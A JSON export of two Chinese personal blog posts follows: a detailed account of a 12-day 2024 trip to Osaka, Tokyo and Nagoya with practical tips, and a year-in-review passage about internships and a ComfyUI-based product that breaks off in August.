[{"content":"去年，也就是 2024 年，正好大学毕业了，考虑到将来工作可能没空玩，并且大学生资格比较好拿日本签证，于是有了这一趟日本旅行。\n从 7 月 16 号到 7 月 29 号，整趟旅行 12 天，大阪-东京-名古屋，和女朋友玩了个遍。\n出行前 出行前需要准备好签证、机票和酒店。\n签证 签证一般需要一周左右才能办理完成，有效期从下发当天开始计算。 其中可能会需要你填写预计出行时间，这个不重要，只要在签证有效期内出行，不超过 15 天停留即可。 我的情况是刚毕业，学信网在线验证报告那边好像还没写毕业，所以可以申请在读大学生签证。 大学生签证有效期是 3 个月，6 月 22 日申请，7 月 1 日就拿到了签证。\n签证申请材料略复杂，其实都是送到领事馆审核，能不能通过要看旅行社的资质和经验。 每家店的要求材料不一样，所以我没法给出具体意见。 多人同行的话记得送同一家店就行，一般他们材料审核通过就会一起寄到领事馆那边。\n我的情况是，我和女朋友都是户口和读书地不一样。 之前不懂的时候就在每家旅行社都问一遍，户口/居住地/大学地点每家店都给出了不一样的回答，都说他们店办不了，以至于我非常绝望 😱。 最终是在深圳华侨城（飞猪）申请的，申请流程很完善，女朋友已毕业一年，需要的材料比我多一个租房证明。 所幸材料正好齐全，才在忐忑不安的心情下寄出了护照和其他材料。\n另外，我在去年年初被叫去了公安局一趟问话，那个某某事件嘛，懂得都懂。 也不知道有没有留什么记录，所幸不影响我的签证下发。\n机票 签证申请寄出后便开始查询机票了。 其实旅行路线还没规划，只是大概估计了下在大阪落地。 可能由于当时是出行低峰期，还有许多廉价机票，便没急着买。\n焦虑地等待了一周后，签证终于在 7 月 1 日顺利下发了 😌。 然后火速地查来回机票方案。 去的机票原本在昨天还看到有廉价直达的，但突然就没有了，没办法就订了一趟中转的山东航空，约 1300 每人。 回的机票就比较难订，大多数都是比较贵的，最终订的是深圳航空，约 1800 每人。\n最终的飞行路线是这样的：\n去程：7 月 16 日 深圳航空 深圳-山东（中转）-大阪 回程：7 月 29 日 山东航空 名古屋-深圳 其实原本还想订日本航空公司的，但是略贵就没订了，以后有机会再体验吧。\n酒店 酒店可以等机票确定了再订。 一定要注意酒店的最晚入住时间，有的民宿或酒店夜间是不接客的。\n推荐一下我用的几个渠道：飞猪、美团、爱彼迎（国内 airbnb）。 推荐国内的平台是因为较便宜。\n大阪的酒店和民宿都比较便宜，300-400 RMB，质量也不错。\n东京就需要多看看，很难找到 400 RMB 以下的，并且民宿的价格高出酒店几倍，不推荐长住。 浅草和池袋的酒店性价比较高，但是交通就一般般了。 如果上面三个平台都没有合适的房的话，booking 可以作为兜底的渠道。 另外，东京里大多数便宜的酒店都是那种公共浴室的，体验一般般，有钱还是建议买好点的。\n极力推荐 试一下民宿，大部分都是自助入住，居室大、干净、有大大的浴缸，有时候甚至还能用到奇妙的本土洗衣机 😮\n规划 签证、机票和酒店整理并规划起来并不算容易。\n先办签证的话，就容易买不到廉价机票。 先办机票的话，签证没下来、下发延迟、或者哪里有问题需要重新申请的话，机票可能就需要退票或者改签。 因为签证有效期从签发当天就开始计算了，如果不急着出行的话，在签证下发后再订机票也行。 另外，订机票还是需要多对比一下，能省很多钱。\n出行规划的话，我常用 兰图绘 标一下想去的地点，大致规划一下前进方向，然后放开玩就行了，也没必要细致规划到每一天。 自由行可以把侧重点放在 city walk 上，逛商业街等等。 圣地巡礼会花费很多时间和交通费，也需要规划。\n解决了签证、机票和酒店三大问题，其实后续就没什么问题了\u0026hellip;呃，好像还有地铁、JR、支付方式、取现金、换硬币\u0026hellip;很多问题 😑\n常见问题 境外取现 我使用的是中国银行长城跨境通 MasterCard 借记卡（非人哉），三年前办的，线下开通过程也很简单。 该卡的具体介绍可以见 这篇文章。\n取现前首先要转入资金。 由于该卡没有人民币账户，所以需要使用另一张卡进行结汇购汇，再转入该卡。 日元现汇和日元现钞应该都行，同汇率，中行似乎没区别。我购买的是现汇。\n下面是我旅行时按顺序 ATM 现金取款的记账（来自短信）：\n取款金额（+ ATM 手续费） 总扣除金额（加上冻结） 扣除比例 10000 10200 0.02 10000 10681 0.068 20000(+220) 21107 0.043 10000 10685 0.068 10000 10673 0.067 其中，第一笔取款就是该卡每月第一笔境外取款免手续费，冻结的 200 日元应该只是固定冻结 2% 防盗刷的。 第二、四、五笔取款就是正常的，手续费计算细则可以参照 中国银行服务价目表 中 一、个人金融 文件的 8.借记卡 栏目。 第三笔取款则附带了 ATM 自身手续费 220 日元。\n第三笔取款似乎是在 711 店内 ATM 进行的，这个手续费还是挺高的，建议去地铁附近或者商场附近取款。\n由于我没有开通中国银行微银行的借记卡动账提醒，所以不清楚冻结部分扣了多少，没法推算计算细则。\n消费 确保借记卡里有日元现汇后，就可以随便在 711 等便利店、饭店、商场等几乎所有地方刷 POS 机消费了。 刷 POS 机没有任何手续费，只有 2% 额外冻结，这就是借记卡最大的好处。 在这趟旅行中，该卡没有任何拒付，体验还是很不错的。\n特别需要注意，该卡只能插入式消费，不能感应或者刷磁条。 旅行的前三天我不知道这一点，试了很多次才消费成功 😥\n除了刷卡和现金消费，我也推荐在可能的时候使用微信支付或者支付宝支付，有时候汇率有优惠，会划算一点。\n冻结 借记卡取现/支付时，固定有 2% 的额外冻结。 据我实测，冻结金额要 7 天左右才能解冻。\n另外，根据我线上支付的经验，该卡使用美元支付时不会有 2% 的额外冻结。\n什么？你卡 FTF 是 0，那我用美元支付不就行了？\n答案是不行。该卡的扣款顺序是 交易币种现汇 \u0026gt; 交易币种现钞 \u0026gt; 美元现汇 \u0026gt; 美元现钞。 日本当地支付使用日元，就算付美元也会自动转为日元再支付。\n地铁 \u0026amp; JR 地铁即都营铁路，JR 即国有铁路。\n大阪市内主要就是 Osaka Metro，JR 坐的比较少，相对于东京，大阪交通还是比较方便的。\n东京市内地铁和 JR 的站点分布不均匀，有时候需要换乘才能到达目的地，地铁和 JR 之间的换乘需要先出站再重新入站。 并且日本轨道交通比较贵，不同类型的铁路换乘往往意味着 加倍 的路费。\n复杂的就不讲了\u0026hellip;很多复杂路线和换乘我也没搞明白也坐错过。\n体验上来说都没有国内列车稳。\n注意订酒店的时候一定要考虑到交通问题，不仅能少走一点路，也能省很多钱。 比如我住东京的时候订了三天的日暮里樱花酒店，虽然离 JR 站有 700 多米，但是去池袋、秋叶原、涉谷、浅草四个方向都很方便。\n自由行不推荐购买地铁 Pass 和 JR Pass。 我不小心购入了 1500 日元的东京地铁三日卡，但考虑了一下性价比还是没用它，回国后放到咸鱼上卖掉了。\n大阪 - 东京 从大阪到东京，有三种交通方式可以选择：\n交通方式 时间 价格 飞机 1 小时 25 分钟 乐桃航空 6863(1500) 日元 / 人 新干线 2 小时 21 分钟 13870 日元 / 人 夜间巴士 21 点 - 第二天 6 点，9 小时 4500 日元 / 人 其中，飞机价格约 6863 日元机票费 + 1500 日元税费（带托运行李），合算是 8363 日元。 原本有考虑机票的，不过那个时候没买到低价机票，便放弃了。\n作为穷游人士并且没体验过夜间巴士，我最终选择了它。 便宜并且可以直接到达市中心，不失为一个优秀的选择。 在微信 willer 即可购票，简单便宜快捷。 注意一定要 提前预约，大巴票比你想象中卖的快，都是满人。\n其他长途也差不多，比如东京-名古屋，我选择的也是巴士 6 个钟到达。\n换硬币 玩扭蛋机、使用投币洗衣店等很多地方都需要用到日元硬币。 日元硬币中，最常用的是百圆硬币，也就是「百円」，读作「Hyakuen」，建议多学学相关的句子。\n可以从下面三个渠道获取硬币：\n游戏厅机器可以万元纸币直接换千元纸币、百圆硬币 附近有扭蛋机的话，可以直接找店员换取，没有也可以硬着脸皮问一下 饮料机、交通卡充值处可以投入超出额度的硬币或者纸币，结算完就会返还硬币 其中，第 3 点是我奇思妙想出来的方案，不算实用但是可以用哈哈 😂\n由于硬币比较重，每次在游戏厅买硬币也买不了多少，真正遇到一个想要抽的扭蛋其实是不够用的，所以有时候找店员换还是有必要的。\n常用日语 本人没正规学过日语，只是略微知道罗马音拼写。 平时也就看看动漫，但是足以应付我这趟旅途的日常交流。 （考了 n2 的女朋友有时候讲的都没我好 🙄）\n常用：\nkono kaado tsukuremasuka? 可以办理这个卡吗？（taskure 直译是制作的意思） B setto hitotsu onegaishimashi. （点餐时）B 套餐一份。 kaado onegaishimashi. （支付时）使用卡片支付。 hyakuen coin no kokan onegaishimashi. 请给我交换百圆硬币。 实际交流后，感觉自己的词汇量还是太少了，有很多听不懂的。 以后有机会再学学，争取能看懂日文。\n旅行 去程登机过程很轻松，国际航班安检也没有要求开包检查之类的。 落地延误了半个钟。 入境登记人挺多的，所幸可以用 visit japan web 登记一下，出示二维码再录下指纹就可以通过了。\nvisit japan web 里面还有个免税码，不过实测没用，店家登记不了，还是得靠护照。\n出机场，到车站自助办理了一张 ICOCA 交通卡。 原本想坐 haruka 号，但发现有点贵就算了，下次再说，买的这趟好像是急行列车，也挺快的。\n16 号晚，入住酒店，然后在地图上找了一家附近的拉面店吃点东西。 炸鸡和面都非常美味！可惜没记店名，后面想找也找不到了 😭\n17 号睡懒觉，午饭吃了寿司。 和酒店柜台询问洗衣机位置时，把「sentakuki」念错成了「sentaku」，最后还是用英文沟通的。 哈哈，果然只凭看动漫的经验来念日文还是不熟练。 后来使用了附近的自助投币洗衣机。（后续都是直接谷歌地图搜 laundry）\n下午去了大阪城。\n喂鸽子吃咪咪零食，后来才发现有禁止喂鸽子的告示牌。\n离开大阪城的时候看到了动漫里那种垂直向上出水的饮水处（大概可以喝），试了试还挺新奇的。\n然后陪女朋友去了康帕斯咖啡厅，买周边，点了卡布奇诺和芭菲。 第一次吃芭菲感觉和期待中的不太一样，团子之类的比较多，冰激凌反而比较少。 在店里换了硬币，然后玩了下旁边的扭蛋。\n晚上去机厅玩音游 🤤🖐️🕹️ 第一次体验日本机厅，太棒了！\n回酒店路上吃了点章鱼烧和麦当劳，日本麦当劳挺好吃的。 然后去了投币洗衣店，等衣服等了好久。 最后泡澡很舒服。 酒店里的电视机有播动漫的频道，当时好像在播「你与我最后的战场 2」最新话，在电视上看动漫感觉挺新鲜的。\n18 号早上，行李寄存在酒店后，便起身前往京都。 京都线正好有座位，坐车挺舒服的。\n中午看了眼小红书，去了一家网红乌冬面吃饭，亲子烧饭和乌冬面超级美味，是平生吃过最好吃的乌冬面 🥰\n去稻荷大社途中看到了 chikawa 店铺，逛了会买点周边。\n在东丸神社买了个御守。\n抽了个神签，凶吉不分。\n到了稻荷大社。\n在鸟居走了走，由于预定只在京都玩一天，为了赶往下一个地点，我们下山了。\n紧接着去了「玉子爱情故事」圣地巡礼，在出町柳。\n遇到了一个懂一点中文的外国人，聊的很开心，我给他介绍了这个地方在动漫里面也有出现。\n女朋友走累了就没去轻音部的圣地巡礼了。 回去坐的京都线也正好有座位，可以放松一下。\n晚上在心斋桥的 HMV 店逛，买了孤独摇滚的 CD 和其他两个 CD 带给朋友，第一次用免税支付。 在商场下面随便吃了点快餐，便宜好吃。 然后去 round1 玩游戏 🤤🖐️🕹️，遇到了很多国内的人随便聊了聊。\n玩完后提取行李前往下一个住宿地点 —— 爱彼迎订的民宿，是整趟旅行中性价比最高的住宿地点。\n还体验了一下民宿的本土洗衣机，搞错了按钮 😂 衣服一直泡着水不动，后来查了查才知道怎么用。\n19 号早早起身坐近铁奈良线前往奈良，这趟列车上没什么信号，不过有座位。\n中午在一家比较有名的寿司店吃中饭，冰面和冰茶，夏天吃起来很爽快。\n前往奈良公园的路上遇到了很多鹿，200 日元一份鹿饼还挺便宜的，买了几份。 不过刚开包就被鹿顶了过来，攻击性很强哈哈，你倒是去攻击卖鹿饼的啊 😂\n在奈良公园走走停停，天气实在太热了 🥵\n后来去买票去爬若草山，虽说爬山要门票还是第一次，不过也不贵好像也就 200 日元。 所幸若草山树林多，爬的时候不用晒太阳，很快就可以爬到山腰上。\n刚到山腰的时候感觉一切汗水都值了，山腰上的风景非常棒，和小鹿玩的很开心。\n坐了一会下山了，感觉这风景有 XP 系统壁纸那感觉了。\n下山顺路去了春日大社看看，回家的时候第一次体验上了大巴，再转乘近铁奈良线回家，座位还是挺多的，可以放松一下。\n晚上在千日里吃了 sukiya 日本店还是很棒的，相比国内的店要好一点。 在这里第一次成功刷上了万事达借记卡，原来只有插入能支付 😮 刷成功之后，我就一直在用借记卡支付，不得不说，掏出一张 MasterCard 借记卡刷卡支付真的很爽。\n音击我又来咯 🤤🖐️🕹️ 看到了音击活动，然后捣鼓了半个多钟注册了 sega 和 ongeki 账号才看到游玩次数，用这个才能兑换活动奖品。\n回民宿的路上发现了一个小角落进去就是 av 店铺 😮 还是第一次在日本看到这些东西（色色打咩！）\n晚上躺在床上规划东京的路线和酒店预订。\n20 号睡个懒觉，中午吃了一家相对较便宜的和牛店，在日本桥站花了 1200 日元寄存了两个行李箱。\n下午逛日本桥。 在 k-books 买了一些 pjsk 谷子。 逛了一圈 animate 都是日文也没什么好买的。 逛骏河屋买了一大堆本子，色色爽！\n晚上吃了松屋的快餐。 吃完后又来音击咯 🤤🖐️🕹️ 但是今晚没玩多久，要赶往东京了。\n掐点恋恋不舍地离开机厅后就去找夜间巴士站了，但是很快便后悔没有提前出发了。 巴士站不仅在地图上难找，还遇上了修路，最后不得不跑步赶路，差点就迟到了。 累死了 🥵 以后再也不掐点了。\n除了难以入睡之外，夜间巴士体验还是不错的，会播报告诉你什么时候能到，什么时候停车，每 2-3 小时会在服务站停靠休息。\n21 号早上大巴到了东京市中心，然后前往浅草办理酒店入住，下午 3 点才能入住于是只能先寄存行李。 在这点上，大巴还是挺累人的。 没法早点进房休息还是挺难受的，只能拖着疲惫的身子去逛浅草寺。\n逛完浅草寺去 taito 玩音游了 🤤🖐️🕹️\n中午吃了萨莉亚，排队有一万个人，等了接近半个钟，这就是日本萨莉亚的火爆。 菜品和国内完全不同，还是非常香的 😋\n下午继续在 taito 玩音游 🤤🖐️🕹️ 玩到 3 点，印了俊达萌卡片 🤩，和女朋友各攒了 15pt 换音击立牌。\n然后早早回酒店休息了，路上没看到饭店，就在 711 买了晚饭带走。\n22 号睡了个懒觉，退房。\n中午去吃了 LAND_A 餐厅，意大利面、中餐鸡肉盘非常好吃也不贵。 然后在旁边的 ichiya 吃了超大刨冰 😲 和芭菲，顶级甜品，就是有点贵，一份 100 RMB 左右。\n吃完去日暮里樱花酒店办理入住了。\n下午去了埼玉县和一个朋友见面。 带我们去了一家超大的堂吉诃德，买了很多零食，还买了一瓶生啤酒。\n然后去冰川神社玩。\n晚上四人去吃居酒屋 tabehoudai（任意吃任意喝） 🎉 全是 yakitori（鸡肉串烧）吃的好撑。\n23 号早上起床，惊喜地发现酒店提供了自助早餐，面包咖啡牛奶，还有烤面包机。 虽然没用过烤面包机，但是尝试了几次后就能烤出香脆的面包了，非常好吃。\n自此成为了烤面包机信徒 🙏 以后家里也要添加一台伟大的烤面包机。\n出门来到了著名的秋叶原电器街，二次元浓度没有想象中高，不过站街女仆倒是真的多。\n总之先去 Gigo 玩音击 🤤🖐️🕹️ 打完活动开始印卡，刷刷刷！\n路过吉野家吃个中饭，然后沿街一直逛 animate 还有一些不知名的店，买了点周边。 途中在某店内甚至还看到公屏放里番 🤯 不得不再次惊呼日本的开放程度。\n发现了原神 animate 绘画展宣传海报，在池袋本店举办。 后续去池袋看了，不过好像必须提前预约，门外还排着长队，就没进去了。 门票也不算贵 2000 JPY 左右，有点遗憾没预约。\n最后去了 melonbooks 蜜瓜书店，拐角处负一楼，有那味了哈哈。 有很多画册、短本、单行本，看日期估计大多都是去年夏 comi 留下的。\n晚饭吃了食其家的鱼肉碎盖饭，还挺好吃的。\n晚上到浅草去看花火大会，内外环转乘啥的很复杂，KS 线迷路了一小会。 下车非常拥挤，人群堵了十多分钟。 不过还好准时看到了第一发烟花。\n这里虽然在住宅区，但也算是一个不错的观景区。 江边简直是人山人海，太挤了。\n晚上回酒店睡了，又热又累。\n24 号出发去池袋，中饭吃了一家中式饭店（本次旅途唯一一家有蔬菜的饭馆），日本人意外的多。\n搜了搜池袋路线，还是挺复杂的。 依次逛了虎之穴、animate、k-books、lashinbang、骏河屋等很多店。 中途下了一点雨，所幸没下太久，不影响逛街。 路过了 bookoff 虽然好奇但没进去看。 池袋二次元浓度虽然高，店铺也很多，但是大部分都是女性向的。 最后去了优衣库买了几件衣服。\n还看到了夏 comi 2024 的宣传册，不过为啥第一页是碧蓝航线。 去日本的日期正好比夏 comi 提前了几天，就不去夏 comi 了，以后有机会再说吧。\n晚上看推荐吃了一家汉堡肉，好吃。 Gigo 音击我来了 🤤🖐️🕹️。 最后逛街去了 melonbooks 买了俊达萌卡套，正好可以套音击卡片，萌萌的。\n25 号早上收拾东西去下一家民宿。 然后坐地铁来了新宿，偶然间发现了 JR 宝可梦集章活动，然后开启了集章之旅，集章处还有挺多人在排队。\n出了新宿 JR 站，第一眼看到的就是 3D 猫咪，挺可爱的。 这里没拍到，就拍了另一只。\n去了 melonbooks，发现了好多很棒的扭蛋，花掉了 4000+ JPY。\n中午在街边吃了一家很油的拉面，产生了心理阴影。\n下午去了涉谷 HMV 和 TOWER RECORDS 逛街，买了两个碟。\n在大商城看到了 VISA 联动卡好多啊，可惜我当时还没正式工作暂时办不了。 只能遗憾退场。\n晚饭吃的是明太子和烤鱼，吃饭倒是还好，但是茶泡饭给我恶心到了一点点，有点不习惯。\n晚上跑去新宿玩扭蛋又花了 2000+ JPY。 然后跑去玩音游了 🤤🖐️🕹️\n玩完估计晚上 9 点多吧，看到很多混混垫着纸箱坐在街上。 不过毕竟新宿嘛，还有歌舞伎町之类的可能比较乱，倒也不是很意外。\n26 号一早起来前往葛西水族馆，在海边看风景，玻璃观景房内居然有空调，还是挺舒服的。\n捏他了一下 sakana 拍照，太羞耻就不放了。\n在水族馆玩了一上午，然后在里面的餐馆吃饭，日本景点内吃饭还是挺实惠的，这点比中国要好很多。\n下午和女朋友一起坐钻石与花大摩天轮，虽然没到傍晚，但风景依旧很美。\n玩完然后起身前往上野 JR 站收集宝可梦印章。 地铁上看到了猴痘感染者 😱 当时还比对了一下网上照片，几乎一模一样，挺害怕的。 怕惹事所以也没拍照，只能祈祷了哈哈，所幸我和女朋友没感染。\n到了上野站，终于集齐了 6 个印章在 newdays 上野店兑换了宝可梦礼品。\n晚上还没啥规划，于是走到了秋叶原，吃了麦当劳和拉面，出乎意料的是，这家拉面店竟然要求每个人都点主食拉面，真无语，不过味道不错。 下次点餐多注意一下告示牌吧。\n重温秋叶原街道\u0026hellip;嗯，真的很大。\n音击启动！ 🤤🖐️🕹️\n玩完就回去民宿了。 东京之旅到这里差不多结束了。\n27 号睡懒觉然后收拾行李出发，前往新宿巴士总站（前往名古屋）。 总站内有便利店，正好就在这里吃中饭了，不过车站在 4 楼也是我没想到的。\n上车了，看了眼谷歌地图路过了富士山，但是雾有点浓没看到山； 6 个小时很快过去，下车到达名古屋。 正好旁边就有个大商场，吃了麦当劳，然后到旁边 Gigo 音击启动 🤤🖐️🕹️\n晚上入住民宿，舒服地泡了个澡，还是东京外面的地方住宿爽啊。\n虽然来到了名古屋，但是隔天下午就要坐飞机走了，并没有太多时间给我们去市中心或者吉卜力玩，所以便放弃了，下次再来玩吧。\n28 号上午来到了附近的 aeon mall，人非常多，二楼吃饭的地方更是爆满，也算是误打误撞地来到了一个宝藏地点，无论是吃的还是玩的都非常棒！ 餐点都很便宜，800-1300 JPY 有各式各样的饭菜，缺点是饭点时要排上半个钟的队伍。 这边音击没什么人玩，活动礼品也没兑换完，于是打算今天直接冲击 60pt。\n中饭吃的是炸猪排和天妇罗冷荞麦面，然后玩了一下午音击 🤤🖐️🕹️ 下午吃了可丽饼（CREPE）好吃，晚饭吃的是乌冬面和明太子面。\n战斗了一天，疯狂砸钱\u0026hellip;\n到晚上终于攒够了 60pt 兑换音击活动 CD！\n在商场内逛了会，发现一只招财猫猫！\n人也累瘫了，回民宿睡觉了。\n29 号上午闪击 aeon mall 音击启动 🤤🖐️🕹️ 玩了两把又换了个角色立牌。\n中饭在商场吃了拉面和蔬菜干面（后者味道一言难尽，难吃）。\n然后就去机场咯，办理了行李托运，从柜台了解到了免税商品放行李箱不需要提前告知，也不用检查。 还有一张机票附赠一张一千元的商品券，不过只能购满 5000+ JPY 的时候使用一张。 于是随便挑了点吃的带走了。\n最后顺利从深圳机场出来了，带着半箱的零食和半箱的本子。\n结束 来到日本，第一感受就是谷歌不用挂梯子真的很爽，第二感受就是饮料机好爽每天都有新体验，第三感受就是鸽子乌鸦真的好多。\n此外，经常可以看见碧蓝档案广告牌啥的，感觉挺有趣的。 饮料机的饮料种类非常多，甚至每个饮料机都不一样，就像摇奖一样非常有趣。 游戏厅的抓手办机看起来也挺有趣，虽然没玩。 最开心的应该是在奈良公园和小鹿玩耍。 没有垃圾桶是真的，公厕也少，日本人固执死板也是真的，经常有些莫名其妙的规定。\n饮食方面，我觉得日本的饮食还是蛮适合我的，虽然三大家的定食有点枯燥无味，但是拉面、炸鸡、鸟烧、烧肉之类的都挺不错的，吃的很开心。 不过蔬菜很少这一点是硬伤，我估计也习惯不了天天吃拉面。 日本菜单看不懂不用担心，可以用 kulikuli 翻译一下，实测还是挺好用的。\n交通卡。 女朋友用的是 iphone 西瓜卡，挺方便的，交通和便利店基本都能用。 我则是在自助机器办理的 ICOCA 卡，虽然经常要拿现金来充值，不过日本地铁公交全刷也挺方便的。\n音游方面，主要就是音击了，能打上 12 级曲 98+ 了，这个游戏 6k 还是挺难的。 还有 maimai 歌很多，玩玩 pjsk 和术力口很开心。 还玩了某旧款初音 4k 音游和其他一些有意思的游戏。\n二次元方面，认识了很多店铺，比如 melonbooks、k-books、amiami、lashinbang 等，骏河屋偶尔也能发现好东西。 animate 池袋本店东西很多很棒，非常推荐去。\n旅游全程都很兴奋，虽然平时是个 I 人，但是出行时我是真的能变为 E 人，变得比我女朋友还社牛，什么都想尝试一下，哈哈，也算是放开身心去享受了一回。 虽然在最热的月份来了日本，走路很热也很累，但是兴奋感还是远远高于疲惫感。\n后记 旅行照片中的一部分使用松下 LX10 拍摄，一部分则为手机拍摄，精选放了 56 张，都没有后期加工。 其中，相机拍摄的文件带有 _camera 后缀。 照片全部使用 iloveimg 批量处理，56 张图片原分辨率太大了，压缩后也有 70 多 MB，所以只能把尺寸缩小一半，最终一共 24.8 MB。 JPG 的压缩率已经挺高了，我就不转 WebP 了。 最终采用了 Cloudflare R2 作为博客图片托管，后续图片可能都会迁移到这上面。\n长达 12 天的旅游记录整理为 QA \u0026amp; 图文博客真的不容易，花了 3-4 天时间来整理。 主要是第一次去日本确实也有很多不懂的地方，记录下来也方便自己参考。 时隔半年才写下这篇博文，可能也有遗漏的地方，后续想到什么会再补充，就这样吧。\n本次旅途双人成行，12 天下来全费用平均每人耗费 1w RMB 左右，算较低的消费水平了，不过这也有我和女朋友兴趣相近的原因吧，吃喝玩乐倒也没有很节约。\n下次来日本就是夏 comi、北海道、冲绳或者富士山！还有音击！\n","date":"2025-01-20T15:17:25+08:00","image":"https://blog-r2.tinyume.com/2025/2024-japan-travelling/111_camera.jpg","permalink":"https://blog.tinyume.com/2025/2024-japan-travelling/","title":"日本旅行"},{"content":"回顾一下 2024 年的博文，只写了一篇 Hackergame 的，感觉表达欲望降低了很多。\n由于今年写的东西太少，所以本篇讲的内容会更多，而不仅仅是白话文。\nTimeline 一月份\n离开了长春，纪念一下美丽的雪景。\n学校刚放寒假，我便前往广州寻找实习。 此前苦于学业和学校要求，连大四上学期都有课程安排。 首先是大厂投的都没什么反应，倒是在意料之内。 毕竟双非本，没有含金量高的项目，很难得到认可。\n后来在 boss 找了两周左右，有 4、5 家面试邀请吧，其中比较有名的有 喵斯快跑、APISIX、健力宝 这些。\n还接到了几家小公司的面试，第一家去面试的小公司就比较可怕，地址在小区里面，房间很小，几个人在那搞加密货币，问的问题也很简单，顶天也就 python 装饰器，我怀疑技术官都不懂。 最后问我会不会 solidity 我直接说了不熟，毕竟我只写过 withdraw 这种小玩意，合约没碰过多少，更别提合约安全性。\n第二家小公司给我感觉就不错，电话面试的，聊了聊我的经历，然后就说我通过了。 他们吸引我的地方在于创始人都是大厂出来的，虽然只有一个前字节的负责 web 全栈和技术架构，至少技术底子应该是有的。 而且看了他们以前的海外 C 端产品，感觉非常优秀。\nAPISIX 那边 Go 岗位的话，我也不太熟就没去面试了，不过他们后面暴雷了我就不细讲了。\n喵斯快跑比较感兴趣去面试了，他们公司在广州郊区。 技术面体验很差，从自我介绍和项目介绍完后，就只问了我 redis 相关的问题，还是 redis 的特有函数和特有用法，给我感觉就是把他们项目用到的什么业务奇淫技巧炫耀了一遍，我寻思这也没什么意思。 不过他们公司环境还是挺不错的，作为音游痴而言 🥰 还收获了一袋子参加面试就能拿到的周边。\n最后直接去了第二家遇到的小公司，和他们去做海外 C 端产品了。 开放办公区环境还不错，也有双屏显示器。\n期间还和女朋友去广州动物园玩了，玩得很开心，也吃了很多好吃的。 广州茶点非常美味，彩点这个餐馆也很棒很实惠，已收藏，也非常推荐去吃。 虽然钱钱有点少，但也是花在了幸福的地方 🥰\n美食图片就不放了 😋\n二月份\n收到了一笔意外之财，开源项目的 STRK 空投，折合现金一千多元，也是一笔不错的收入。 应该是得益于之前为 CPython 贡献的 3 个 PR。 转出研究了很久，最后是用币安 c2c 转出的。\n公司那边产品还处于 idea 阶段，技术栈是 nextjs，我便在学习 react。 顺便帮忙做了些 chatgpt 知识库的 API 调研。\n碎碎念一下，公司大佬用的妙控板看起来真不错，我也有点想要（至今还没用过 macbook）。另外经常看他在写 rust 不知道在写什么东西。\n公司新产品和 ComfyUI 相关，期间我还写了个 ComfyUI 的插件 400+ star。\n元宵节回了一趟惠州博罗老家。\n三月份\n在深圳西丽租了个单间，除了房租贵了点其余都还不错。\n公司里核心技术骨干因为身体原因突然离职了，就只剩我一个懂前端的，于是我就需要负责项目的 MVP。 至于 nextjs 我才刚学，不敢直接用，担心出了问题没法解决。\n其实我内心已经隐约感觉到，缺少了核心人员，这个项目估计干不了多久。\n后来采用了 nuxt3 + shadcn-vue 的技术栈，这不是一个出海 c 端的主流技术栈，但是没办法，需要赶鸭子上架。 所幸 nuxt3 开箱即用，很多特性还是非常好用和易懂的。 不过 hydrate、useFetch 之类的理念实现起来还是比较困难的，有很多 JS 方言（比如上下文切换），经常容易踩坑。 想要做出优秀的架构也不容易。\n其余的事情，就是和女朋友参观了南山区大冲那边的一个美术展。 产生了毕业去日本玩的想法，于是先去办理了护照。 陪女朋友去广州打 HPV 疫苗。\n四月份\n养了一只三线仓鼠，非常亲人。\n公司搬到了南山区。 通勤变为了公交\u0026hellip;南山区的交通真的一言难尽。\n花了一个月半就把 MVP 实现了。 nuxt3 + vue-flow 前端实现和后端任务执行器的实现。\nMVP 长这个样子：\n这个产品主要是把 ComfyUI 给重构并优化了一下，最主要的功能是\n参数简化，将 optional 参数抽离到高级参数面板，加入我们封装的易用性区块，帮助用户快速上手 嵌套画布，构建一个嵌套画布为虚拟节点，并自动抽离未连接插槽，在执行时才进行参数扁平化，可以极大地简化大型工作流页面 高级 Reroute，连线颜色动态变化，节点智能提示等 这三点写起来都特别困难，不过最终还是都实现了。\n具体 UX 我就不讲了，低代码平台有很多交互细节，也都挺难写的，所幸最终还是完成了。\n后端也是个困难的部分，不仅是要写代码，还要部署到 runpod，由于没有自动化脚本，部署起来比较困难，还有几百个 G 的模型需要管理。 监控也困难，这点没考虑到是我的问题，即便接入最简单的普罗米修斯，也可以对后续节点扩容分析提供数据。\n这个产品在内测期间也收获了很多用户，虽然我不直接参与 discord 社区运营，但是能看到 DAU 有 50+，任务执行量也不错。 不过用户粘性挺低的，缺少宣传的时候基本就没有新用户。\n产品现在已经下线，没法给大家体验了。\n五月份\n五月初便坐飞机赶回学校，开始忙毕设。 飞机晚点了很久，还好航空公司那边提供酒店入住，躺了一会后，半夜突然就起飞了。\n公司那边就比较人性化，说我可以远程自己找时间干活，每个月上报一下实习天数就行。\n为了在长春不留遗憾，想着把这边著名的食物吃一遍，去吃了元盛居，非常好吃。\n毕设就是医疗报告生成，参考一个项目用了 ViT + GPT-2，学习到了很多东西。 实现起来不是特别难，论文水一水就行。 其实最终做出来的效果还挺好的，于是我给出的全是事实依据，没有任何虚构数据。\n准备离开了，拍照纪念一下校园。\n六月份\n毕设答辩。\n中旬回深圳了，有点受不了舍友的呼噜声，于是我申请了提前离校，毕业照都不想拍。 在这个学校没度过什么有意义的时光，也没什么特别好的朋友。 双证则是让舍友帮忙寄回来了。\n实习公司那边，我和他们说我不考虑转正了，主要原因还是缺少核心技术成员。 我是感觉很遗憾的，因为在他们公司待得挺舒服的，沟通起来也非常舒服，也可以开出一个不错的薪资。 不过他们还有游戏业务，已经 上架 steam 了，看起来很棒很羡慕。 希望他们能继续做大做强吧。\n能够知道一个令人舒服的公司是什么样子的，这对我今后的人生有很大影响。\n后来去办理了大学生日本签证，期间手续还是很麻烦，很担心申请不到，具体的我会在旅行的那篇文章讲讲。\n六月底还和 nonebot 的几个大佬聚会了，大家都是巨佬，毕业就去字节高薪，相比之下我就是个蒟蒻 😢\n七月份\n前两周在规划日本旅行，还去深圳金沙湾玩了一下。\n时间很快来到了中旬，准备出发了。\n出发前两天感到意外的放松。 当然也有各种焦虑，会担心随身 wifi 能不能准时到，也会担心关西空港晚上停运就没车坐之类的。 但是真正到了将要出行的时候，心里还是充满了对未知的期待。\n然后开始了 12 天的旅行。 具体就不在这里细讲了，在准备另一篇文章，总之非常开心 🥳\n八月份\n从日本回来了后，第一件事就是找工作了。\n这次找工作是在母亲推荐下（绝对不是凭关系）去面试了一家 C# 做 ToB 的公司。 问的也就异步线程安全并行并发那些，没问太复杂的。面完当场就说通过了，人有点懵。 8 号就迅速地给我发了 offer，月薪 1w + 13 薪，大小周。\n但是我非常犹豫要不要去，因为是自己从未接触过的行业和语言。 